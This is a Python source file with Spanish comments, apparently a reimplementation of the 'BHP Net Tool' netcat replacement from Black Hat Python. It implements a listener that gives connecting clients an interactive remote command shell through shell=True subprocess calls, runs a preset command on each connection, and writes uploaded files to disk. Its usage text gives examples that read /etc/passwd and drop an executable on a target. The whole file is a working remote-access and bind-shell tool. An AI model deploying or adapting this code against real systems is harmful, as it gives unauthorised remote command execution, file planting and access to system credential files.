import sys
import socket
import getopt
import threading
import subprocess

# Definir algunas variables globales
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0

# Esta función muestra cómo usar el script
def usage():
    print("BHP Net Tool")
    print()
    print("Usage: bhpnet.py -t target_host -p port")
    print("-l --listen - listen on [host]:[port] for incoming connections")
    print("-e --execute=file_to_run - execute the given file upon receiving a connection")
    print("-c --command - initialize a command shell")
    print("-u --upload=destination - upon receiving connection upload a file and write to [destination]")
    print()
    print("Examples: ")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print('bhpnet.py -t 192.168.0.1 -p 5555 -l -e="cat /etc/passwd"')
    print("echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)

# Función principal
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if len(sys.argv[1:]) == 0:
        usage()

    # Leer las opciones de la línea de comandos
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:", 
            ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    # Procesar las opciones de la línea de comandos
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    # Si no estamos escuchando, enviar datos desde stdin al objetivo
    if not listen and len(target) > 0 and port > 0:
        buffer = sys.stdin.read()
        client_sender(buffer)

    # Si estamos escuchando, iniciar el servidor
    if listen:
        server_loop()

# Función para enviar datos al objetivo
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((target, port))
        if len(buffer):
            client.send(buffer.encode())
        while True:
            # Recibir la respuesta del servidor
            response = client.recv(4096)
            if len(response) == 0:
                break
            print(response.decode(), end="")
            buffer = input("")  # Obtener nueva entrada del usuario
            buffer += "\n"
            client.send(buffer.encode())
    except Exception as e:
        print(f"Error en la conexión: {e}")
    finally:
        client.close()

# Función para manejar las conexiones entrantes
def server_loop():
    global target
    global port

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    print(f"[*] Listening on {target}:{port}")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")

        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()

# Función para manejar las peticiones de los clientes
def handle_client(client_socket):
    global execute
    global upload_destination
    global command

    # Si se debe ejecutar un comando
    if len(execute):
        output = run_command(execute)
        client_socket.send(output.encode())

    # Si se debe subir un archivo
    if len(upload_destination):
        file_buffer = receive_file(client_socket)
        file_descriptor = open(upload_destination, "wb")
        file_descriptor.write(file_buffer)
        file_descriptor.close()
        client_socket.send(f"[*] Successfully saved file to {upload_destination}\n".encode())

    # Si se debe iniciar un shell de comandos
    if command:
        command_shell(client_socket)

# Función para ejecutar comandos
def run_command(command):
    command = command.strip()
    output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    return output.decode()

# Función para recibir un archivo
def receive_file(client_socket):
    file_buffer = b""
    while True:
        data = client_socket.recv(1024)
        if not data:
            break
        file_buffer += data
    return file_buffer

# Función para iniciar el shell de comandos
def command_shell(client_socket):
    while True:
        client_socket.send(b"Shell> ")  # Mostrar el prompt
        cmd_buffer = client_socket.recv(1024)  # Leer el comando del cliente
        if cmd_buffer == b"exit\n":  # Si el comando es 'exit', cerramos la conexión
            break
        if cmd_buffer:  # Si hay un comando
            response = run_command(cmd_buffer.decode())  # Ejecutar el comando
            client_socket.send(response.encode())  # Enviar la respuesta al cliente



if __name__ == "__main__":
    main()
